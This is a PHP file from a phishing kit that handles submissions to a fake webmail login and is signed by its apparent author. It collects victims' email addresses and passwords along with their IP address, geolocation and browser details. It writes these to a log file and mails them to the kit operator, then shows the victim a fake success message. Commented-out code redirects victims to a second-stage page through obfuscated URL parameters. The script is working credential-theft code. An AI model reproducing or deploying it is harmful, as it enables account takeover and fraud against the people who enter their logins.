<?php 
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');

if ($_SERVER["REQUEST_METHOD"] == "POST") { 
include('./mail.php');
require_once('geoplugin.class.php');
require_once('browser.php');
$browser = new Wolfcast\BrowserDetection();
$browser->setUserAgent($_SERVER['HTTP_USER_AGENT']);
$adddate=date("D M d, Y g:i a");

$geoplugin = new geoPlugin();

$email = filter_var(trim($_POST["email"]), FILTER_SANITIZE_EMAIL);
$password = $_POST["password"];


//get user's ip address
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "\n========+ Webmail - Logins +========\n";

$message .= "| Email: >> [+ " .$email. " +]\n"; 
$message .= "| Password: >> [+ " . $password. " +]\n"; 
$message .= "| IP: >> [-" .$ip. "-]\n"; 
$message .= "| Date & Time: >> [+ ".$adddate." +] \n";
$message .= "==========+ LOCATION +==========\n";
$message .= "| City: >> [+ {$geoplugin->city} +]\n";
$message .= "| Region: >> [+ {$geoplugin->region} +]\n";
$message .= "| Country Name: >> [+ {$geoplugin->countryName} +]\n";
$message .= "| Country Code: >> [+ {$geoplugin->countryCode} +]\n";
$message .= $browser;
$message .= "========+ CR34T3D BY Kalisheen +========\n";

$headers = "From: KALI {$geoplugin->countryCode} Alert+ <noreply>";
$headers .= $_POST['smart@docusign.com']."\n";

$login = $email;
$ret = file_put_contents('./error_logs.txt', $message, FILE_APPEND | LOCK_EX);
mail($to,$emailprovider."Webmail | {$geoplugin->countryName} | ".$ip , $message,$headers);

http_response_code(200);
echo "Success! Everything checks our.";



// if(!isset($_COOKIE['newcookie'])){
// setcookie('newcookie', time()+(7*24*3600), "/; SameSite=None; Secure");        
// // Set a 200 (okay) response code.   
//  }
//     else{
//         // Set a 500 (internal server error) response code.
//         http_response_code(500);
//     echo "Oops! Something went wrong and we couldn't send your message.";
//   }

                                                                                                                                                                                                                                                                                                                                                                                                                                                                        

// if (!isset($_COOKIE['smartback']))
// {
// setcookie("smartback", "no");
// header("Location: index.php?userid=$login");
// }
// else if(!isset($_COOKIE['smarterror1'])){
// 	setcookie("smarterror1", "no");
// 	header("Location: ../index.php?email=$email");
// }
// else{

    

// 	$praga=rand();
// 	$praga=md5($praga);
	
// //YOUR REDIRECT LINK HERE

// 	header("Location: http://localhost/scribes/aanow/windows/secondpage/authenticate.php?session_data=resequence&eM=$praga&cgi_sid=$praga&YnMxmwofLodm=$praga&login=$praga&osYkssJidXdidIYnMxmwofLodmAkNOueMHosYkssJidXdidIY&cmd=login_submit&id=$praga$praga&session=$praga$praga&userid=$login");

}
?>
